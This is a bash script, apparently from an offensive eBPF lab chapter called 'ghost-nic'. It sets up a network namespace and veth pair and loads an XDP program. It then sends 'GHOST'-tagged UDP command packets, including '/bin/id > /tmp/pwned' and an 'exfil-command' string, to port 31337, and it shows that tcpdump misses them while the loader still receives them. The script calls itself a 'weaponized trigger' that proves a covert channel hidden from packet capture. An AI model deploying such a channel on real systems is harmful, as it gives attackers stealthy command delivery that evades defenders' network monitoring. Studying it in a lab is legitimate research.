#!/bin/bash
# ch05b-ghost-nic weaponized trigger.
#
# Architecture (flipped from the original):
#   ghost_ns (attacker)   ──veth_g1──┤├──veth_g0──  host (listener)
#     10.66.66.2                                     10.66.66.1  (XDP here)
#
# The XDP program is attached to veth_g0 (host-side) on ingress. An attacker
# inside ghost_ns sends "GHOST"-magic UDP packets to 10.66.66.1:31337.
#
# Proof structure:
#   BEFORE: no XDP attached. tcpdump on veth_g0 captures all 2 magic packets
#           (they reach the host-side netdev normally).
#   AFTER : XDP loaded. tcpdump on veth_g0 sees 0 matching UDP/31337 frames
#           (generic XDP runs before AF_PACKET tap), but the attacker's
#           ringbuf still logs both commands.
#
# All primitives are torn down on EXIT regardless of outcome.
set +e

HERE="$(cd "$(dirname "$0")" && pwd)"
LOADER="$HERE/build/ch05b-ghost-nic"
LOG_LOADER="$(mktemp -t ch05b-loader.XXXXXX.log)"
LOG_TCPDUMP_BEFORE="$(mktemp -t ch05b-tcpdump-before.XXXXXX.log)"
LOG_TCPDUMP_AFTER="$(mktemp -t ch05b-tcpdump-after.XXXXXX.log)"
LOADER_PID=""
TCPDUMP_PID=""

cleanup() {
    if [ -n "$TCPDUMP_PID" ] && kill -0 "$TCPDUMP_PID" 2>/dev/null; then
        kill -TERM "$TCPDUMP_PID" 2>/dev/null
        wait "$TCPDUMP_PID" 2>/dev/null
    fi
    if [ -n "$LOADER_PID" ] && kill -0 "$LOADER_PID" 2>/dev/null; then
        kill -INT "$LOADER_PID" 2>/dev/null
        wait "$LOADER_PID" 2>/dev/null
    fi
    ip link show veth_g0 >/dev/null 2>&1 && ip link set dev veth_g0 xdp off 2>/dev/null
    ip link del veth_g0 2>/dev/null
    ip netns del ghost_ns 2>/dev/null
    rm -f "$LOG_LOADER" "$LOG_TCPDUMP_BEFORE" "$LOG_TCPDUMP_AFTER"
}
trap 'cleanup' EXIT INT TERM

if [ ! -x "$LOADER" ]; then
    echo "=== loader not built: $LOADER (run: make) ==="
    exit 1
fi
for tool in ip tcpdump python3; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "missing required tool: $tool" >&2
        exit 1
    fi
done

echo "=== ch05b weaponized trigger from $HERE ==="

echo "=== creating veth pair + ghost_ns ==="
ip netns add ghost_ns 2>/dev/null
ip link add veth_g0 type veth peer name veth_g1 || { echo "veth add failed"; exit 1; }
ip link set veth_g1 netns ghost_ns
ip addr add 10.66.66.1/24 dev veth_g0
ip -n ghost_ns addr add 10.66.66.2/24 dev veth_g1
ip link set veth_g0 up
ip -n ghost_ns link set veth_g1 up
ip -n ghost_ns link set lo up

echo "=== veth pair up ==="
ip -br link show veth_g0
ip -n ghost_ns -br link show veth_g1

# Sender helper — emits exactly 2 "GHOST"-magic UDP packets from ghost_ns
# toward the host-side listener. Kept in a function so BEFORE/AFTER send
# identical frames.
send_two() {
    ip netns exec ghost_ns python3 -c '
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b"GHOST/bin/id > /tmp/pwned", ("10.66.66.1", 31337))
s.sendto(b"GHOSTexfil-command-2", ("10.66.66.1", 31337))
print("sent 2 ghost packets")
'
}

############################################################
# BEFORE — no XDP attached. tcpdump on veth_g0 should see both packets.
############################################################
echo ""
echo "=== BEFORE: starting tcpdump on veth_g0 (no XDP) ==="
# -U line-buffered, -p non-promisc (we want only frames destined locally too),
# filter UDP/31337 so we count only the magic.
tcpdump -l -nn -U -i veth_g0 -c 2 'udp and port 31337' \
    > "$LOG_TCPDUMP_BEFORE" 2>&1 &
TCPDUMP_PID=$!
sleep 0.5

send_two

# Give tcpdump time to flush; -c 2 exits once it saw 2, otherwise timeout.
for _ in 1 2 3 4 5; do
    if ! kill -0 "$TCPDUMP_PID" 2>/dev/null; then break; fi
    sleep 0.4
done
if kill -0 "$TCPDUMP_PID" 2>/dev/null; then
    kill -TERM "$TCPDUMP_PID" 2>/dev/null
    wait "$TCPDUMP_PID" 2>/dev/null
fi
TCPDUMP_PID=""

BEFORE_COUNT=$(grep -cE "IP .*\\.31337:" "$LOG_TCPDUMP_BEFORE" 2>/dev/null)
BEFORE_COUNT=${BEFORE_COUNT:-0}
echo "=== BEFORE tcpdump log ==="
cat "$LOG_TCPDUMP_BEFORE"

############################################################
# AFTER — load XDP on veth_g0, re-send. tcpdump should see 0; ringbuf sees 2.
############################################################
echo ""
echo "=== AFTER: starting loader (XDP skb-mode) on veth_g0 (log: $LOG_LOADER) ==="
"$LOADER" -S -i veth_g0 >"$LOG_LOADER" 2>&1 &
LOADER_PID=$!
sleep 1

if ! kill -0 "$LOADER_PID" 2>/dev/null; then
    echo "=== loader exited early ==="
    cat "$LOG_LOADER"
    exit 1
fi

echo "=== AFTER: starting tcpdump on veth_g0 (XDP active) ==="
tcpdump -l -nn -U -i veth_g0 -c 2 'udp and port 31337' \
    > "$LOG_TCPDUMP_AFTER" 2>&1 &
TCPDUMP_PID=$!
sleep 0.5

send_two

# Same wait pattern; tcpdump will likely hit the 2s timeout since XDP drops.
for _ in 1 2 3 4 5; do
    if ! kill -0 "$TCPDUMP_PID" 2>/dev/null; then break; fi
    sleep 0.4
done
if kill -0 "$TCPDUMP_PID" 2>/dev/null; then
    kill -TERM "$TCPDUMP_PID" 2>/dev/null
    wait "$TCPDUMP_PID" 2>/dev/null
fi
TCPDUMP_PID=""

# Give ringbuf a moment to drain into the loader log.
sleep 1

# Stop loader so it detaches cleanly.
if [ -n "$LOADER_PID" ] && kill -0 "$LOADER_PID" 2>/dev/null; then
    kill -INT "$LOADER_PID" 2>/dev/null
    wait "$LOADER_PID" 2>/dev/null
fi
LOADER_PID=""

AFTER_COUNT=$(grep -cE "IP .*\\.31337:" "$LOG_TCPDUMP_AFTER" 2>/dev/null)
AFTER_COUNT=${AFTER_COUNT:-0}
RINGBUF_COUNT=$(grep -cE "\\[ghost\\] DROPPED" "$LOG_LOADER" 2>/dev/null)
RINGBUF_COUNT=${RINGBUF_COUNT:-0}

echo "=== AFTER tcpdump log ==="
cat "$LOG_TCPDUMP_AFTER"
echo ""
echo "=== AFTER loader/ringbuf log ==="
cat "$LOG_LOADER"

############################################################
# Weapon markers — grep-friendly for the harness.
############################################################
echo ""
echo "=== BEFORE (no XDP) === tcpdump_captured=${BEFORE_COUNT}"
echo "=== AFTER  (XDP active) === tcpdump_captured=${AFTER_COUNT}  ringbuf_captured=${RINGBUF_COUNT}"
echo "=== GHOST_COVERT_CHANNEL_PROVEN dropped=${RINGBUF_COUNT} tcpdump=${AFTER_COUNT} ==="
echo "=== done ==="
